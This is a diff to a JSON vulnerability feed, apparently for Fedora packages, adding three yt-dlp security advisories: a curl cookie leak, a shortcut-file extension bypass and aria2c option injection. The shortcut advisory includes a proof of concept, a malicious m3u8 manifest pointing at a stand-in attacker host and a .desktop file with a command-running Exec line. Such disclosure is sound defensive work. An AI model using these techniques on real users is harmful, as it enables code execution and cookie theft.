@@ -30,6 +30,78 @@
                         "identifier": "fc45"
                     }
                 ]
+            },
+            "CVE-2026-50019": {
+                "cve_id": "CVE-2026-50019",
+                "title": "yt-dlp: File Downloader cookie leak with curl ",
+                "description": "### Summary\nIf curl is used an external downloader for yt-dlp, cookies may be leaked to an unintended host upon HTTP redirect or when the host for download fragments differs from their parent manifest's.\n\nThis is the equivalent to [GHSA-v8mc-9377-rwjj](<https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-v8mc-9377-rwjj>) for the `curl` downloader. The vulnerable behavior is present in [yt-dlp](https://github.com/yt-dlp/yt-dlp) released since 2023.09.24.\n\n### Details\nAt the file download stage, the cookies are passed by yt-dlp to the file downloader via `--cookie`. However, unless these are loaded from a file, this operation does not activate the cookie engine. As a result, `curl` will send cookies with requests to domains or paths for which the cookies are not scoped.\n\nAn example of a potential attack scenario exploiting this vulnerability:\n1. an attacker has crafted a malicious website with an embedded URL designed to be detected by yt-dlp as a video download. This embedded URL has the domain of a trusted site that the user has loaded cookies for, and conducts an [unvalidated redirect](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) to a target URL.\n2. yt-dlp extracts this URL and calculates the cookies which are then passed to `curl`.\n3. the download URL redirects to a server controlled by the attacker, to which `curl` forwards the user's sensitive cookie information.\n\n### Patches\nyt-dlp version 2026.06.09 fixes this issue by doing the following:\n\n- Pass the cookies through stdin via `--cookie -` if `curl` is version 7.59 or higher.\n- Pass the cookies via `--cookie /dev/fd/0` if the system supports this device file.\n- In all other cases create a temporary file, save the cookies and then pass via `--cookie <file>`.\n\n### Workarounds\nIt is recommended to upgrade yt-dlp to version 2026.06.09 as soon as possible.\n\nFor users who are not able to upgrade:\n\n- Do not use `--downloader curl`.",
+                "severity": "MEDIUM",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.09.26-1.fc43",
+                        "fixed": "2026.06.09-1.fc43",
+                        "identifier": "fc43"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "2026.06.09-1.fc44",
+                        "identifier": "fc44"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "2026.06.09-1.fc45",
+                        "identifier": "fc45"
+                    }
+                ]
+            },
+            "CVE-2026-50023": {
+                "cve_id": "CVE-2026-50023",
+                "title": "yt-dlp: Dangerous file type creation via insufficient filename sanitization (Bypass of CVE-2024-38519)",
+                "description": "### Summary\nA vulnerability exists in yt-dlp that allows a remote attacker to write arbitrary OS-shortcut files (such as `.desktop`, `.url`, `.webloc`) to the user's filesystem, bypassing the remediation for `CVE-2024-38519`. \n\n### Details\nThe fix for `CVE-2024-38519` enforced an allowlist for file extensions, in order to prevent writing files with unsafe extensions (such as `.exe` or `.sh`) during file downloads. However, this allowlist explicitly included the unsafe extensions `.desktop`, `.url`, and `.webloc` so that the functionality of the `--write-link` option (and its variants) could be preserved. These allowlist inclusions can be exploited by an attacker to write malicious OS-shortcut files in the context of a media or subtitles download.\n\nNumerous yt-dlp extractors derive the downloaded media or subtitles file extension from a potentially attacker-controlled source. An attacker could craft an m3u8 file that contains an `EXT-X-MEDIA:TYPE=SUBTITLES` tag with a malicious URI (e.g., `URI=\"http://attacker/x.desktop\"`), which would result in yt-dlp writing the attacker-controlled content to a file with a `.desktop` extension if the user had passed the `--write-subs` option.\n\nWriting OS-shortcut files next to downloaded videos provides a high-probability social engineering vector. The extension of the shortcut file is often hidden from the user, e.g. on Windows by default or on many Linux desktop environments. \n\nWhile these shortcut files are typically used to point to web locations via URLs, they can also contain shell commands or point to remote executables. The user may be deceived into opening the malicious shortcut disguised as a \"subtitles\"/media file, leading to a phishing attack or arbitrary code execution.\n\n### Proof of Concept\n**1. Start a malicious server:**\nHost a malicious `master.m3u8` manifest that points to malicious subtitle payloads:\n```m3u8\n#EXTM3U\n#EXT-X-MEDIA:TYPE=SUBTITLES,GROUP-ID=\"subs\",NAME=\"English\",URI=\"http://attacker/payload.desktop\",LANGUAGE=\"en\"\n```\nAnd host the `payload.desktop` file with malicious content:\n```ini\n[Desktop Entry]\nType=Application\nExec=sh -c \"touch /tmp/ytdlp_pwned_$(id -u)\"\nName=Subtitle\n```\n\n**2. Trigger the download:**\nIn this case, the generic extractor triggers the exploit if the `--write-subs` option is used:\n```bash\nyt-dlp --write-subs -o \"MyVideo.%(ext)s\" \"http://attacker/master.m3u8\"\n```\n\n**Result:** yt-dlp writes `MyVideo.en.desktop` to disk, containing the attacker payload.\n\n### Patches\nyt-dlp version 2026.06.09 fixes this issue by removing `.url`, `.desktop` and `.webloc` from the global file extension allowlist, and by only allowing those file types to be written from within the context of the `--write-link` options' functionality.\n\n### Workarounds\nIt is recommended to upgrade yt-dlp to version 2026.06.09 as soon as possible.\n\nUsers who are not able to upgrade should do ALL of the following:\n\n- Only pass fully **trusted** input URLs to yt-dlp\n- Do not use the `--write-subs`, `--write-auto-subs`, `--embed-subs`, `--write-thumbnail`, `--write-all-thumbnails`, or `--embed-thumbnail` options\n- Use `--format -` to interactively select download formats and validate their file extensions",
+                "severity": "HIGH",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.09.26-1.fc43",
+                        "fixed": "2026.06.09-1.fc43",
+                        "identifier": "fc43"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "2026.06.09-1.fc44",
+                        "identifier": "fc44"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "2026.06.09-1.fc45",
+                        "identifier": "fc45"
+                    }
+                ]
+            },
+            "CVE-2026-50574": {
+                "cve_id": "CVE-2026-50574",
+                "title": "yt-dlp: Arbitrary code execution via manifest downloads with aria2c",
+                "description": "### Summary\nIf aria2c is used as an external downloader for a fragmented manifest format (such as an HLS/DASH stream), yt-dlp passes insufficiently sanitized input to aria2c that allows an attacker to perform an arbitrary file write. On Windows platforms, this can lead to immediate arbitrary code execution. On non-Windows platforms, this can lead to arbitrary code execution upon the next invocation of yt-dlp.\n\n### Details\nWhen downloading a fragmented manifest format such as an HLS or DASH stream, yt-dlp first extracts a list of all fragment URLs from the stream's manifest. If the user has selected aria2c as an external downloader, yt-dlp then constructs an input file for aria2c from the fragment URL list and passes its filepath as the argument to aria2c's `-i` option.\n\naria2c's `-i` (or `--input-file`) option allows for downloading a list of URIs from the given text file. The text file must be formatted as a list of URIs separated by newlines. aria2c's format permits configuration lines for each URI, which can contain command-line options to be given to aria2c. These optional lines follow each URI line and are signified only by leading whitespace. yt-dlp constructs the input file with these optional lines so that it's able to specify the output filename for each fragment using the `out=` option.\n\nyt-dlp's utilization of the aria2c input file format presents two known attack vectors:\n\n1. An attacker can craft a malicious DASH manifest with one or more fragment URLs that contain `&#10;`, which is the HTML escape sequence for a newline. yt-dlp interprets this escape sequence as an actual newline character when writing the fragment URLs to the aria2c input file, which allows for an attacker to inject arbitrary aria2c options into the input file. With option injection, the attacker can achieve arbitrary file writes. This attack vector is possible only via downloads of DASH formats, since their manifests are an XML format which necessitates unescaping of HTML special characters.\n\n2. An attacker can craft a malicious metadata response where the data parsed by yt-dlp as the `title` field (or any other metadata field that the user includes in their output template) contains strategically placed newlines and magnet URIs. If the user has passed the `--no-windows-filename` option to disable sanitization of newlines in output filenames, the attacker is able to achieve arbitrary file writes by injecting arbitrary URIs and options into the aria2c input file. This attack vector is possible via downloads of both HLS and DASH formats.\n\nOn Windows, attacker-controlled file writes can lead to immediate arbitrary code execution: the attacker could write a malicious executable file named `ffmpeg.exe` to the current working directory, and it could be invoked during the postprocessing stage if the user's `yt-dlp.exe` also resides in the current working directory.\n\nOn all platforms, attacker-controlled file writes can lead to arbitrary code execution on repeat invocations of yt-dlp: the attacker could write a yt-dlp configuration file (`yt-dlp.conf`) to the current working directory containing a malicious `--exec` argument.\n\n### Patches\nyt-dlp version 2026.06.09 fixes this issue by removing support for downloading fragmented manifest formats with aria2c.\n\n### Workarounds\nIt is recommended to upgrade yt-dlp to version 2026.06.09 as soon as possible.\n\nFor users who are not able to upgrade:\n\n- Add `--downloader dash,m3u8:native` to your yt-dlp command.",
+                "severity": "HIGH",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.09.26-1.fc43",
+                        "fixed": "2026.06.09-1.fc43",
+                        "identifier": "fc43"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "2026.06.09-1.fc44",
+                        "identifier": "fc44"
+                    },
+                    {
+                        "introduced": "0",
+                        "fixed": "2026.06.09-1.fc45",
+                        "identifier": "fc45"
+                    }
+                ]
             }
         }
     }
